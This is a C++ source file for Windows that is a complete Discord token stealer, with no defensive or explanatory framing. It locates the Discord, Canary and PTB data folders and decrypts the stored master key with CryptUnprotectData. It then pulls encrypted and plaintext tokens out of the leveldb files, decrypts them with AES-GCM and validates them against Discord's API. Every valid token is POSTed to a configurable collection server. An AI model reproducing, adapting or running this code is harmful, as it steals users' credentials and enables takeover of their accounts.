
#include <iostream>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <regex>
#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <winhttp.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "winhttp.lib")

namespace fs = std::filesystem;

static const int B64index[256] = {
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0, 62, 63, 62, 62, 63,
   52, 53, 54, 55, 56, 57, 58, 59, 60, 61,  0,  0,  0,  0,  0,  0,
    0,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
   15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,  0,  0,  0,  0,  0,
    0, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
   41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51
};

std::string base64_decode(const std::string& input) {
    if (input.empty()) return "";
    std::string clean_in;
    for(char c : input) {
        if (isalnum((unsigned char)c) || c == '+' || c == '/' || c == '=') {
            clean_in.push_back(c);
        }
    }
    int len = clean_in.length();
    if (len % 4 != 0) return "";
    int pad = 0;
    if (len >= 1 && clean_in[len - 1] == '=') pad++;
    if (len >= 2 && clean_in[len - 2] == '=') pad++;
    int outLen = (len * 3) / 4 - pad;
    std::string out;
    out.reserve(outLen);
    for (int i = 0; i < len; i += 4) {
        int n = (B64index[(unsigned char)clean_in[i]] << 18) | (B64index[(unsigned char)clean_in[i + 1]] << 12) |
                (B64index[(unsigned char)clean_in[i + 2]] << 6) | (B64index[(unsigned char)clean_in[i + 3]]);
        out.push_back(n >> 16);
        if (out.length() < outLen) out.push_back((n >> 8) & 0xFF);
        if (out.length() < outLen) out.push_back(n & 0xFF);
    }
    return out;
}

// made by beepdev


std::vector<BYTE> get_master_key(const std::string& base_path) {
    std::string local_state_path = base_path + "\\Local State";
    std::ifstream file(local_state_path);
    if (!file.is_open()) return {};
    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    
    std::string search = "\"encrypted_key\":\"";
    size_t pos = content.find(search);
    if (pos == std::string::npos) return {};
    pos += search.length();
    size_t end_pos = content.find("\"", pos);
    if (end_pos == std::string::npos) return {};
    
    std::string b64_key = content.substr(pos, end_pos - pos);
    std::string raw_key = base64_decode(b64_key);
    
    if (raw_key.length() <= 5) return {};
    raw_key = raw_key.substr(5); 
    
    DATA_BLOB in, out;
    in.pbData = (BYTE*)raw_key.data();
    in.cbData = raw_key.length();
    
    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        std::vector<BYTE> key(out.pbData, out.pbData + out.cbData);
        LocalFree(out.pbData);
        return key;
    }
    return {};
}

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

std::string decrypt_val(const std::string& buff, const std::vector<BYTE>& master_key) {
    if (buff.length() < 15 + 16 || master_key.empty()) return "Failed";
    
    std::vector<BYTE> iv(buff.begin() + 3, buff.begin() + 15);
    std::vector<BYTE> payload(buff.begin() + 15, buff.end());
    
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbResult = 0;
    
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS) return "Failed";
    
    std::wstring gcm = BCRYPT_CHAIN_MODE_GCM;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)gcm.c_str(), gcm.size() * sizeof(wchar_t) + sizeof(wchar_t), 0) != STATUS_SUCCESS) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "Failed";
    }
    
    DWORD cbKeyObject = 0;
    DWORD cbDataInfo = 0;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbDataInfo, 0);
    std::vector<BYTE> keyObject(cbKeyObject);
    
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject.data(), keyObject.size(), (PUCHAR)master_key.data(), master_key.size(), 0) != STATUS_SUCCESS) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "Failed";
    }
    
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = iv.data();
    authInfo.cbNonce = iv.size();
    authInfo.pbTag = payload.data() + payload.size() - 16;
    authInfo.cbTag = 16;
    
    DWORD cbData = payload.size() - 16;
    std::vector<BYTE> plainText(cbData);
    
    NTSTATUS status = BCryptDecrypt(hKey, payload.data(), cbData, &authInfo, NULL, 0, plainText.data(), plainText.size(), &cbResult, 0);
    
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    
    if (status != STATUS_SUCCESS) return "Failed";
    
    return std::string((char*)plainText.data(), cbResult);
}

void register_manager(const std::string& token, const std::string& manager_url) {
    HINTERNET hSession = WinHttpOpen(L"BuilderPayload/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;
    
    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    std::wstring wUrl(manager_url.begin(), manager_url.end());
    wUrl += L"/api/receive_tokens";
    
    wchar_t hostName[256];
    wchar_t urlPath[1024];
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = 1024;
    
    if (!WinHttpCrackUrl(wUrl.c_str(), 0, 0, &urlComp)) { WinHttpCloseHandle(hSession); return; }
    
    HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
    
    std::string data = "{\"token\":\"" + token + "\"}";
    std::wstring reqHeader = L"Content-Type: application/json\r\n";
    
    WinHttpSendRequest(hRequest, reqHeader.c_str(), reqHeader.length(), (LPVOID)data.c_str(), data.length(), data.length(), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

bool check_token(const std::string& token) {
    HINTERNET hSession = WinHttpOpen(L"BuilderPayload/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    
    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/api/v9/users/@me", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    
    std::wstring authHeader = L"Authorization: " + std::wstring(token.begin(), token.end()) + L"\r\nContent-Type: application/json\r\n";
    
    bool valid = false;
    if (WinHttpSendRequest(hRequest, authHeader.c_str(), authHeader.length(), WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD statusCode = 0;
            DWORD size = sizeof(statusCode);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &size, WINHTTP_NO_HEADER_INDEX);
            if (statusCode == 200) valid = true;
        }
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return valid;
}

int main(int argc, char** argv) {
    std::string manager_url = "http://localhost:8000";
    
    char appdata[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH);
    std::string appdata_str(appdata);
    
    std::vector<std::pair<std::string, std::string>> paths = {
        {"Discord", appdata_str + "\\Discord"},
        {"Discord Canary", appdata_str + "\\discordcanary"},
        {"Discord PTB", appdata_str + "\\discordptb"}
    };
    
    std::vector<std::string> tokens;
    
    std::regex enc_regex("dQw4w9WgXcQ:([^\"]*)");
    std::regex reg_regex1("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
    std::regex reg_regex2("mfa\\.[\\w-]{84}");
    
    for (const auto& p : paths) {
        std::string base_path = p.second;
        std::string leveldb_path = base_path + "\\Local Storage\\leveldb";
        
        if (!fs::exists(leveldb_path)) continue;
        
        std::vector<BYTE> master_key = get_master_key(base_path);
        
        for (const auto& entry : fs::directory_iterator(leveldb_path)) {
            if (entry.path().extension() == ".log" || entry.path().extension() == ".ldb") {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) continue;
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                
                auto enc_begin = std::sregex_iterator(content.begin(), content.end(), enc_regex);
                auto enc_end = std::sregex_iterator();
                for (std::sregex_iterator i = enc_begin; i != enc_end; ++i) {
                    std::smatch match = *i;
                    std::string b64_token = match[1].str();
                    std::string dec = decrypt_val(base64_decode(b64_token), master_key);
                    if (dec != "Failed") tokens.push_back(dec);
                }
                
                auto reg1_begin = std::sregex_iterator(content.begin(), content.end(), reg_regex1);
                for (std::sregex_iterator i = reg1_begin; i != enc_end; ++i) tokens.push_back(i->str());
                
                auto reg2_begin = std::sregex_iterator(content.begin(), content.end(), reg_regex2);
                for (std::sregex_iterator i = reg2_begin; i != enc_end; ++i) tokens.push_back(i->str());
            }
        }
    }
    
    std::sort(tokens.begin(), tokens.end());
    tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());
    
    for (const auto& token : tokens) {
        if (check_token(token)) {
            register_manager(token, manager_url);
        }
    }
    
    return 0;
}
